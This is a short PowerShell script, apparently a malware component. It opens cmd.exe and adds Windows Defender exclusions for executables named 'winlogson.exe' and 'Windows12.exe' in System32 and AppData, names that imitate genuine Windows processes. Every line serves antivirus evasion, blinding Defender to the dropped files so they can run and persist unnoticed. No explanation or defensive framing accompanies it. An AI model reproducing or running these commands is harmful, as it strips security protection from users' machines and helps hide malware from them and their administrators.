start $ENV:windir/System32/cmd.exe
Add-MpPreference -ExclusionPath "C:\Windows\system32\winlogson\Windows12.exe"
Add-MpPreference -ExclusionPath "$env:APPDATA\Windows12.exe"
Add-MpPreference -ExclusionProcess "Windows12.exe"
Add-MpPreference -ExclusionPath "C:\Windows\system32\winlogson\winlogson.exe"
Add-MpPreference -ExclusionPath "$env:APPDATA\winlogson.exe"
Add-MpPreference -ExclusionProcess "winlogson.exe"
